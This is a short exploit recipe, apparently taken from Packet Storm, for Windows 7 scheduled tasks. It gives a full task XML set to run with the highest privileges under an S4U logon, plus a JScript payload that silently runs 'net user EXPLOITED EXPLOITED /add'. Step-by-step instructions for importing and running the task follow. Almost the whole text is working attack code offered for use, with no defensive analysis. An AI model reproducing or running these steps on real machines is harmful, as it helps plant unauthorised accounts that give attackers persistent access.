From：https://packetstormsecurity.com/files/142191

---

TestOS: Win7x86

### 1. get UserId

cmd:

`whoami`

### 2. create file "w00tw00t.xml"

code:

```
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>1337-01-01T13:37:07.9601296</Date>
    <Author>NT-AUTHORITY\SYSTEM</Author>
  </RegistrationInfo>
  <Triggers />
  <Principals>
    <Principal id="Author">
      <UserId>win-r7mm90erbmd\a</UserId>
      <LogonType>S4U</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>3</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>%USERPROFILE%\Desktop\EXPLOIT.JS</Command>
    </Exec>
  </Actions>
</Task>
```

Change it: `<UserId>win-r7mm90erbmd\a</UserId>`

Save to `%USERPROFILE%\Desktop\w00tw00t.xml`

### 3. create file "EXPLOIT.JS"

code:

```
suidshell = WScript.CreateObject("WScript.Shell");
suidshell.run("cmd.exe /c net user EXPLOITED EXPLOITED /add", 0);
```

Save to `%USERPROFILE%\Desktop\EXPLOIT.JS`

### 4. Run 'taskschd.msc' -> Import Task.. -> Select and Open: w00tw00t.xml -> Run

Add user EXPLOITED

Tips:

- require administrator permission to import Task




